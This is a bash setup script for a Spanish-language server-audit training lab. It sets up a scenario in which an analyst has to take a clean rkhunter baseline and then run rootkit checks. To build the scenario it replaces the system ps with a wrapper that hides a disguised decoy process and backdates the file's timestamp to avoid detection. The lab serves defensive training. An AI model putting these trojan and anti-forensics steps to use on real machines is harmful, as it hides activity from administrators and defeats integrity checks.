#!/usr/bin/env bash
# Lab 111: servidor recién instalado que hay que auditar. Antes de tomar la
# línea base de rkhunter, alguien ya cambió ps por un script que oculta un
# proceso. Si la línea base se toma sin verificar, el troyano queda "bendecido".
set -e
PS=$(dpkg -L procps | grep -E '/bin/ps$' | head -1)
[ -n "$PS" ] || { echo "no encuentro ps de procps"; exit 1; }
cp "$PS" /usr/lib/x86_64-linux-gnu/libprocps-cache.so.0
cat > "$PS" <<'TROJ'
#!/bin/sh
# procps ps wrapper (locale fix)
/usr/lib/x86_64-linux-gnu/libprocps-cache.so.0 "$@" | grep -v 'kswapd-upd'
TROJ
chmod 0755 "$PS"
touch -r /usr/bin/top "$PS"

# Proceso que el troyano esconde.
cat > /usr/local/sbin/kswapd-upd <<'P'
#!/bin/bash
while :; do sleep 3600; done
P
chmod 0755 /usr/local/sbin/kswapd-upd
systemd-run --unit=kswapd-upd --description="Kernel swap helper" /usr/local/sbin/kswapd-upd >/dev/null

# rkhunter sin red (el lab es local).
sed -i 's/^#\?UPDATE_MIRRORS=.*/UPDATE_MIRRORS=0/; s/^#\?MIRRORS_MODE=.*/MIRRORS_MODE=1/; s|^#\?WEB_CMD=.*|WEB_CMD=""|' /etc/rkhunter.conf
rm -f /var/lib/rkhunter/db/rkhunter.dat /var/log/rkhunter.log
chmod 1777 /mnt/offsite

mkdir -p /home/analista/ticket
cat > /home/analista/ticket/TAREA-111.txt <<'TXT'
TAREA-111 · srv-prod-01 · auditoría inicial
El servidor se instaló ayer y mañana se expone a Internet. Antes:
  - Tomar la línea base de rkhunter (y que sea de un sistema SANO).
  - Pasar rkhunter y chkrootkit y revisar cada Warning.
  - Guardar los reportes FUERA del servidor (/mnt/offsite es otro equipo).
Paquetes oficiales sin red: /var/cache/paquetes-oficiales/
TXT
chown -R analista:analista /home/analista/ticket
echo "Lab 111 plantado."
